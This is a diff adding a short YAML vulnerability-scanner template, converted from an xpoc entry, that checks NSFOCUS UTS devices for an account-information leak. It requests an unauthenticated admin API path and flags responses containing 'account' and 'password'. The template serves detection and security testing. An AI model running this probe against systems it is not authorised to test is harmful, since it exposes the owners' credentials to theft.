@@ -1,0 +1,23 @@
+id: yaml-poc-nsfocus-uts-leak-CT-158435
+info:
+  name: Yaml Poc Nsfocus Uts Leak Ct 158435
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-nsfocus-uts-leak-CT-158435'
+  tags: xpoc
+  reference: []
+http:
+- method: GET
+  path:
+  - /webapi/v1/system/accountmanage/account
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - account
+    - password
